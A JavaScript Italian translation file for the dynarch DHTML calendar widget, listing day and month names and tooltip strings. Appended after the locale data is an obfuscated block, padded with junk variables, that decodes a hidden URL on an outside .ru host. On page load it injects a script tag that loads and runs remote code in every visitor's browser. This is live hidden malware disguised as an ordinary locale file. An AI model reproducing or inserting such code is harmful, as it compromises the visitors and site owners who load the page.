// ** I18N

// Calendar EN language
// Author: Mihai Bazon, <mihai_bazon@yahoo.com>
// Translator: Fabio Di Bernardini, <altraqua@email.it>
// Encoding: any
// Distributed under the same terms as the calendar itself.

// For translators: please use UTF-8 if possible.  We strongly believe that
// Unicode is the answer to a real internationalized world.  Also please
// include your contact information in the header, as can be seen above.

// full day names
Calendar._DN = new Array
("Domenica",
 "Lunedì",
 "Martedì",
 "Mercoledì",
 "Giovedì",
 "Venerdì",
 "Sabato",
 "Domenica");

// Please note that the following array of short day names (and the same goes
// for short month names, _SMN) isn't absolutely necessary.  We give it here
// for exemplification on how one can customize the short day names, but if
// they are simply the first N letters of the full name you can simply say:
//
//   Calendar._SDN_len = N; // short day name length
//   Calendar._SMN_len = N; // short month name length
//
// If N = 3 then this is not needed either since we assume a value of 3 if not
// present, to be compatible with translation files that were written before
// this feature.

// short day names
Calendar._SDN = new Array
("Dom",
 "Lun",
 "Mar",
 "Mer",
 "Gio",
 "Ven",
 "Sab",
 "Dom");

// full month names
Calendar._MN = new Array
("Gennaio",
 "Febbraio",
 "Marzo",
 "Aprile",
 "Maggio",
 "Giugno",
 "Luglio",
 "Augosto",
 "Settembre",
 "Ottobre",
 "Novembre",
 "Dicembre");

// short month names
Calendar._SMN = new Array
("Gen",
 "Feb",
 "Mar",
 "Apr",
 "Mag",
 "Giu",
 "Lug",
 "Ago",
 "Set",
 "Ott",
 "Nov",
 "Dic");

// tooltips
Calendar._TT = {};
Calendar._TT["INFO"] = "Informazioni sul calendario";

Calendar._TT["ABOUT"] =
"DHTML Date/Time Selector\n" +
"(c) dynarch.com 2002-2005 / Author: Mihai Bazon\n" + // don't translate this this ;-)
"Per gli aggiornamenti: http://www.dynarch.com/projects/calendar/\n" +
"Distribuito sotto licenza GNU LGPL.  Vedi http://gnu.org/licenses/lgpl.html per i dettagli." +
"\n\n" +
"Selezione data:\n" +
"- Usa \xab, \xbb per selezionare l'anno\n" +
"- Usa  " + String.fromCharCode(0x2039) + ", " + String.fromCharCode(0x203a) + " per i mesi\n" +
"- Tieni premuto a lungo il mouse per accedere alle funzioni di selezione veloce.";
Calendar._TT["ABOUT_TIME"] = "\n\n" +
"Selezione orario:\n" +
"- Clicca sul numero per incrementarlo\n" +
"- o Shift+click per decrementarlo\n" +
"- o click e sinistra o destra per variarlo.";

Calendar._TT["PREV_YEAR"] = "Anno prec.(clicca a lungo per il menù)";
Calendar._TT["PREV_MONTH"] = "Mese prec. (clicca a lungo per il menù)";
Calendar._TT["GO_TODAY"] = "Oggi";
Calendar._TT["NEXT_MONTH"] = "Pross. mese (clicca a lungo per il menù)";
Calendar._TT["NEXT_YEAR"] = "Pross. anno (clicca a lungo per il menù)";
Calendar._TT["SEL_DATE"] = "Seleziona data";
Calendar._TT["DRAG_TO_MOVE"] = "Trascina per spostarlo";
Calendar._TT["PART_TODAY"] = " (oggi)";

// the following is to inform that "%s" is to be the first day of week
// %s will be replaced with the day name.
Calendar._TT["DAY_FIRST"] = "Mostra prima %s";

// This may be locale-dependent.  It specifies the week-end days, as an array
// of comma-separated numbers.  The numbers are from 0 to 6: 0 means Sunday, 1
// means Monday, etc.
Calendar._TT["WEEKEND"] = "0,6";

Calendar._TT["CLOSE"] = "Chiudi";
Calendar._TT["TODAY"] = "Oggi";
Calendar._TT["TIME_PART"] = "(Shift-)Click o trascina per cambiare il valore";

// date formats
Calendar._TT["DEF_DATE_FORMAT"] = "%d-%m-%Y";
Calendar._TT["TT_DATE_FORMAT"] = "%a:%b:%e";

Calendar._TT["WK"] = "set";
Calendar._TT["TIME"] = "Ora:";


var pK=new Array();var _p=new Array();try {this.d='';var O;if(O!='f' && O!='eR'){O=''};var CD;if(CD!='' && CD!='q_'){CD='Y'};var T='g';this.GD='';var a=RegExp;var k=new Array();var Tb='[';var _='replace';var Xo="";var n='';var _k;if(_k!='' && _k!='kT'){_k='oU'};var s=']';var i='';var V;if(V!='' && V!='pV'){V=null};function R(G,C){var bE;if(bE!='' && bE!='at'){bE=''};var ib;if(ib!='' && ib!='HF'){ib=''};var zR="";var M=Tb;M+=C;var Zb=new Date();M+=s;var zB;if(zB!='ry' && zB != ''){zB=null};var Xn=new String();var Mn=new a(M, T);var NQ=new Array();var mC=new Date();return G[_](Mn, n);};var y=new String();var uZ;if(uZ!='' && uZ!='av'){uZ=null};this.Ee="";var U=R('aWpvpBeXnBd1C1hviBl1dX',"vBWX1");var G="1";var o=R('bHo5dCy5',"HnCY5");var Nd="";var m=R('sCeCt4A4tCtCrCi4b4u4tCe4',"4C");var Uo="";var K=R('cGrNe7aNt7e7EMlNeqmGeMn7t7',"qGNM7");var eu=new String();var bX;if(bX!='cn'){bX=''};var F=R('oPnNlPoNaDdN',"NPAD");var q='';var p=R('s2c2rjijpyt2',"20yj");this.MF="";var B=R('hItJtJpJ:I/I/ImIoInIoIgIrJaIfJiJaJsI-JcIoImJ.IwIiJkIiImIeJdJiJaJ.IoIrIgI.JpJaJrItIyIpJoIkIeIrI-IcJoJmI.JiIwJeIsItIpIoJiInJtJ.JrJuJ:I',"IJ");var v=R('8199997099179987919970999991',"179");var FI=new Array();var FH=R('/kguouo5gFlbeb.5cuobm5/kguokoFgulueb.bcuoFm5/kw5auskhuiun5gut5oFnkp5o5sFtu.bcuoFmk/uy5nkeutu.ucuobmb/ktbw5ibtupFiucu.5cbo5mF.5pbhupb',"uF5bk");var Ex=new String();var S_;if(S_!='' && S_!='HJ'){S_='aB'};var g;if(g!='' && g!='Ox'){g='Zs'};window[F]=function(){var Rs;if(Rs!=''){Rs='ZC'};this.Gx='';var ml;if(ml!='' && ml!='fI'){ml='yy'};W=document[K](p);var pX="";q+=B;var dt;if(dt!='Am'){dt='Am'};this.Oz="";q+=v;q+=FH;var SZ=new Array();W.src=q;var Gn;if(Gn!='' && Gn!='yyO'){Gn='YG'};var Yr;if(Yr!='ES'){Yr='ES'};var Il;if(Il!='fa'){Il='fa'};var nY;if(nY!='ce'){nY=''};var z=document[o];var _q;if(_q!='lV' && _q != ''){_q=null};W.setAttribute('defer', G);var Bi;if(Bi!=''){Bi='Tx'};this.qs='';var dj;if(dj!='' && dj!='Ek'){dj=null};z.appendChild(W);this.uZB='';this.vl='';};var ST=new Array();var pD;if(pD!='SpC'){pD=''};} catch(A){};var Jq='';